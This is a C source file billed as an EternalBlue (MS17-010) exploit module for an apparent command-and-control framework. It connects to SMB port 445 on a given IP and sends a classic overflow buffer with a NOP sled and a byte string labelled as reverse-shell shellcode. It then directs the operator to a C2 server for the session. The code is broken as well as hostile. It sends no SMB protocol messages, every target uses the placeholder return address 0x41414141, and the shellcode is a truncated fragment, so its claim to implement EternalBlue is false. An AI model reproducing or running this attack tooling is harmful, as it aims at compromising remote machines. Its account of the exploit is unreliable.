/*
 * Moonlight C2 Framework - MS17-010 Exploit Module
 * CVE-2017-0144 - EternalBlue SMBv1
 * Target: Windows XP, Vista, Windows 7, Server 2003, Server 2008
 * Type: Remote
 * Auto-generated on 2025-12-02
 * 
 * WARNING: For authorized security testing only
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define TARGET_PORT 445

void print_banner() {
    printf("\n");
    printf("Moonlight C2 - MS17-010 Exploit Module\n");
    printf("CVE-2017-0144 - EternalBlue SMBv1\n");
    printf("For Authorized Penetration Testing Only\n");
    printf("\n");
}

// Shellcode: reverse shell payload
unsigned char shellcode[] = 
    "\x90\x90\x90\x90"  // NOP sled
    "\x33\xC9\x83\xE9\xAF\xE8\xFF\xFF\xFF\xFF\xC0\x5E\x81\x76\x0E"
    "\x7E\x4B\xB6\xFC\x83\xEE\xFC\xE2\xF4\x82\xA3\x34\xFC\x7E\x4B";

typedef struct {
    const char* name;
    const char* ret_addr;
    int offset;
} Target;

Target targets[] = {
    {"Windows XP", "0x41414141", 1024},
    {"Vista", "0x41414141", 1024},
    {"Windows 7", "0x41414141", 1024},
    {"Server 2003", "0x41414141", 1024},
    {"Server 2008", "0x41414141", 1024},
};

int num_targets = sizeof(targets) / sizeof(Target);

void list_targets() {
    printf("Available targets:\n");
    for (int i = 0; i < num_targets; i++) {
        printf("  [%d] %s (RET: %s)\n", i, targets[i].name, targets[i].ret_addr);
    }
}

BOOL exploit_ms17_010(const char* target_ip, int target_index) {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    unsigned char exploit_buffer[4096];
    int exploit_size = 0;
    
    if (target_index < 0 || target_index >= num_targets) {
        printf("[!] Invalid target index\n");
        return FALSE;
    }
    
    printf("[*] Target: %s\n", target_ip);
    printf("[*] Using target profile: %s\n", targets[target_index].name);
    
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[!] WSAStartup failed\n");
        return FALSE;
    }
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("[!] Socket creation failed\n");
        WSACleanup();
        return FALSE;
    }
    
    server.sin_family = AF_INET;
    server.sin_port = htons(TARGET_PORT);
    server.sin_addr.s_addr = inet_addr(target_ip);
    
    printf("[*] Connecting to %s:%d...\n", target_ip, TARGET_PORT);
    
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        printf("[!] Connection failed\n");
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }
    
    printf("[+] Connected\n");
    printf("[*] Building exploit buffer...\n");
    
    // Build exploit buffer
    memset(exploit_buffer, 0x41, targets[target_index].offset);
    exploit_size = targets[target_index].offset;
    
    // Add return address
    unsigned long ret_addr = strtoul(targets[target_index].ret_addr, NULL, 16);
    memcpy(exploit_buffer + exploit_size, &ret_addr, 4);
    exploit_size += 4;
    
    // Add NOP sled
    memset(exploit_buffer + exploit_size, 0x90, 100);
    exploit_size += 100;
    
    // Add shellcode
    memcpy(exploit_buffer + exploit_size, shellcode, sizeof(shellcode) - 1);
    exploit_size += sizeof(shellcode) - 1;
    
    printf("[*] Exploit size: %d bytes\n", exploit_size);
    printf("[*] Sending exploit...\n");
    
    if (send(sock, (char*)exploit_buffer, exploit_size, 0) < 0) {
        printf("[!] Send failed\n");
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }
    
    printf("[+] Exploit sent\n");
    printf("[*] Waiting for response...\n");
    
    Sleep(2000);
    
    closesocket(sock);
    WSACleanup();
    
    printf("[+] Exploitation attempt complete\n");
    printf("[*] Check C2 server for incoming session\n");
    
    return TRUE;
}

int main(int argc, char* argv[]) {
    print_banner();
    
    if (argc < 2) {
        printf("Usage: %s <target_ip> [target_index]\n\n", argv[0]);
        list_targets();
        printf("\nExample: %s 192.168.1.100 0\n", argv[0]);
        return 1;
    }
    
    const char* target_ip = argv[1];
    int target_index = 0;
    
    if (argc >= 3) {
        target_index = atoi(argv[2]);
    }
    
    printf("[*] Starting MS17-010 exploitation\n");
    
    if (exploit_ms17_010(target_ip, target_index)) {
        printf("\n[+] Exploit completed successfully\n");
        return 0;
    } else {
        printf("\n[!] Exploit failed\n");
        return 1;
    }
}
